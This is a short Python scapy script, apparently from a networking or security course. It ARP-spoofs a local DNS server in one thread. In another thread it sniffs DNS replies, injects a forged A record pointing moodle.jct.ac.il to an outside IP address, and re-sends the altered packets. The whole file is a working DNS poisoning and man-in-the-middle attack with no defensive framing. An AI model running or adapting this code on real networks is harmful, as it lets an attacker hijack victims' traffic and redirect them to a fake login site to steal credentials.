from scapy.all import *
import threading
import time
from uuid import getnode
from arpSpoof import attack_ip

DNS_IP='192.168.43.186'
DELAY=1
FAKE_IP='54.229.142.49'


def generate_response( pck):

    resp = IP(dst=pck[IP].src, id=pck[IP].id)\
           /UDP(dport=pck[UDP].sport, sport=53)\
           /DNS()
    resp[DNS]=pck[DNS]
    return resp

def arpspoofing_adapter():
    attack_ip(DNS_IP, DELAY)


def edit_response(pcks):
    for pck in pcks:

        pck[Ether].dst='08:00:27:1e:5c:b0'

        pck[IP].dst='192.168.43.186'
        try:
            pck[DNS].arcount+=1
            pck[DNS].ar.add_payload(DNSRR(rrname='moodle.jct.ac.il', type='A', ttl=1000, rdata=FAKE_IP ))
        except Exception as e:
            pass
        print(pck.show())

        send(generate_response(pck), loop=0,count=2)

def dns_poisoning():
    sniff(prn=edit_response,filter='udp src port 53 and host '+DNS_IP,store=3,count=12)



def main():
    print ('hello')
    #open two threads, one for arpspoofing and another for dns poisoning
    t = threading.Thread(name='arps', target=arpspoofing_adapter)
    s=threading.Thread(name='sniffer', target=dns_poisoning)

    t.start()
    time.sleep(3)
    s.start()

    s.join()
    
#    sniff(prn=send_response,filter=is_dns_query)
if __name__=='__main__':
    main()
